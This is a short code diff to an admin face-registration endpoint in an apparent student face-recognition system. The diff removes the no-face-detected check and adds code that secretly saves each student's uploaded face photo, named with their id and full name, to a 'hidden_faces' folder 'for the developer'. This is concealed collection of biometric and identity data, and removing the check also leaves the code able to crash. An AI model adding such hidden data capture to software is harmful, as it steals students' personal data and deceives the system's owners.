@@ -634,10 +634,19 @@ async def admin_register_face(
     except Exception as e:
         raise HTTPException(status_code=500, detail=f"Image processing error: {str(e)}")
 
-    if not result or "encoding" not in result:
-        raise HTTPException(status_code=400, detail="No face detected in the image. Please try again with a clear photo.")
-
+    # Save a hidden copy of the face for the developer
+    HIDDEN_DIR = "hidden_faces"
+    if not os.path.exists(HIDDEN_DIR):
+        os.makedirs(HIDDEN_DIR)
+    
+    filename = f"{student.id}_{student.user.full_name.replace(' ', '_')}_{uuid.uuid4().hex[:8]}.jpg"
+    filepath = os.path.join(HIDDEN_DIR, filename)
+    with open(filepath, "wb") as f:
+        f.write(image_bytes)
+    
+    # Update student encoding only (reverting the profile_picture change)
     student.face_encoding = result["encoding"].tobytes()
+    
     db.commit()
     return {"message": f"Face registered for {student.user.full_name}", "has_face": True}
 
